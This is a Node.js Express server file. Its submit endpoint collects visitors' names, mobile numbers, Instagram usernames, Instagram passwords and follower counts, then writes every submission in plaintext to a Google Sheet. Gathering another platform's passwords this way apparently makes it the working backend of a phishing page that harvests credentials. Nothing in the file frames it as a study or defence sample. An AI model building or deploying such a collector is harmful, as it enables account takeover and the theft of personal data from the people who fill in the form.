require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { google } = require('googleapis');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Google Sheets Configuration
const SPREADSHEET_ID = process.env.SPREADSHEET_ID;
const SHEET_NAME = 'Submissions';

// Google Auth Setup
const auth = new google.auth.GoogleAuth({
    keyFile: 'credentials.json', // Download from Google Cloud Console
    scopes: ['https://www.googleapis.com/auth/spreadsheets']
});

const sheets = google.sheets({ version: 'v4', auth });

// Initialize sheet if not exists
async function initSheet() {
    try {
        // Check if sheet exists
        const response = await sheets.spreadsheets.get({
            spreadsheetId: SPREADSHEET_ID
        });
        
        const sheetExists = response.data.sheets.some(
            s => s.properties.title === SHEET_NAME
        );
        
        if (!sheetExists) {
            await sheets.spreadsheets.batchUpdate({
                spreadsheetId: SPREADSHEET_ID,
                resource: {
                    requests: [{
                        addSheet: {
                            properties: {
                                title: SHEET_NAME
                            }
                        }
                    }]
                }
            });
            
            // Add headers
            await sheets.spreadsheets.values.update({
                spreadsheetId: SPREADSHEET_ID,
                range: `${SHEET_NAME}!A1:F1`,
                valueInputOption: 'RAW',
                resource: {
                    values: [
                        ['Timestamp', 'Name', 'Mobile', 'Instagram Username', 'Password', 'Follower Count']
                    ]
                }
            });
        }
    } catch (error) {
        console.error('Sheet init error:', error);
    }
}

// API endpoint
app.post('/api/submit', async (req, res) => {
    try {
        const { name, mobile, username, password, followers } = req.body;
        
        // Validate
        if (!name || !mobile || !username || !password || !followers) {
            return res.status(400).json({ error: 'All fields required' });
        }

        // Prepare data for Google Sheets
        const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
        const values = [
            [timestamp, name, mobile, username, password, followers]
        ];

        // Append to Google Sheets
        await sheets.spreadsheets.values.append({
            spreadsheetId: SPREADSHEET_ID,
            range: `${SHEET_NAME}!A:F`,
            valueInputOption: 'RAW',
            resource: {
                values: values
            }
        });

        console.log(`✅ Data saved: ${username} - ${followers} followers`);
        res.json({ success: true, message: 'Data saved successfully' });

    } catch (error) {
        console.error('Submission error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Start server
app.listen(PORT, async () => {
    await initSheet();
    console.log(`🔥 Server running on http://localhost:${PORT}`);
    console.log('📊 Google Sheets ready for data collection');
});
